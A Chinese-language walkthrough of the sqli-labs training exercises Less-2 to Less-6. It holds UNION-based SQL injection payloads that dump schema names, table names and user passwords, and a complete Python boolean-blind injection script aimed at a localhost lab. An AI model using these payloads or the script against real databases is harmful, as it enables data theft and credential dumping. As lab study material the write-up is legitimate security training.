#### Less-2
传入一个单引号试探注入点，发现报错
```
..... syntax to use near '' LIMIT 0,1' at line 1
```
推测和Less-1唯一的区别在于没有单引号，只是用数字进行查询，例如
```
SELECT * FROM users WHERE id=$id LIMIT 0,1
```
所以payload和Less-1差别只在于一个单引号
```
-1 union select 1,2,3 %23
-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23
-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'%23
-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'%23
-1 union select 1,group_concat(username),group_concat(password) from users%23
```
#### Less-3
题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)
测试 ?id=1' 得到
```
...... syntax to use near ''1'') LIMIT 0,1' at line 1
```
猜测语句
```
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```
所以通过前面加 -1') 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了
```
SELECT * FROM users WHERE id=('   -1'){{为所欲为}}#23    ') LIMIT 0,1
```
所以payload
```
-1')union select 1,2,3 %23
-1')union select 1,2,group_concat(schema_name) from information_schema.schemata%23'
-1')union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'%23
-1')union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'%23
-1')union select 1,group_concat(username),group_concat(password) from users%23
```
#### Less-4 
尝试'并未发现报错，尝试"发现报错
```
syntax to use near '"1"") LIMIT 0,1' at line 1
```
猜测语句
```
SELECT * FROM users WHERE id=("$id") LIMIT 0,1
```
所以payload和3差不多只是单引号变双引号
```
-1")union select 1,2,3 %23
-1")union select 1,2,group_concat(schema_name) from information_schema.schemata%23'
-1")union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'%23
-1")union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'%23
-1")union select 1,group_concat(username),group_concat(password) from users%23
```
#### Less-5 在导航页里显示的是要使用双查询
发现正常或者注入成功是这样的
![](2.png)
而一旦出错会抱错
![](1.png)
显然是布尔注入而且猜测语句
```
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```
当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切
打个比方
```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80%23     
//截取数据库下第一个表的第一个字符与80ascii值进行对比

找第二个字符只需要改成substr('xxx',2,1)即可。
找第二个表改成limit 1,1
```
也可以直接拿这个盲注脚本爆破，参数自己改就行了

```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfResult, indexOfChar, mid):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "1'and "
	endStr = " and'1'='1"
	payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"
	payload = startStr + payload + endStr
	return payload

def exce(indexOfResult,indexOfChar,mid):
	# content-start
	url = "http://localhost/sqli-labs-master/Less-5/?id="
	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)
	content = requests.get(tempurl).text
	# content-end
	# judge-start
	if "You are in..........." in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfResult,indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for i in range(32): # 需要遍历的查询结果的数量
		counter = 0
		for j in range(32): # 结果的长度
			counter += 1
			temp = doubleSearch(i, j, 0, 127) # 从255开始查询
			if ord(temp) == 1: # 当为1的时候说明已经查询结束
			    break
			sys.stdout.write(temp)
			sys.stdout.flush()
		if counter == 1: # 当结果集的所有行都被遍历后退出
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

search()
```
#### Less-6 
Less-6和Less-5的关系就和1♂2，3♂4的关系一样 把'改成"在脚本上修改就很行了